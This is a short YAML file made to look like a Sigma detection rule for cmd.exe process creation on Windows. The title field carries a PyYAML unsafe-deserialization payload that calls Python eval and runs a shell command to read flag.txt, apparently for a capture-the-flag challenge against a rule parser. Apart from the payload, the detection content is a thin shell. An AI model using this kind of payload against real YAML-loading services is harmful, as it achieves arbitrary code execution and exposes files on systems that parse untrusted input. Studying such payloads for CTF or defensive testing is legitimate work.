title: !!python/object/apply:builtins.eval
  - "__import__('os').popen('cat flag.txt').read()"
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image: cmd.exe
  condition: selection
level: medium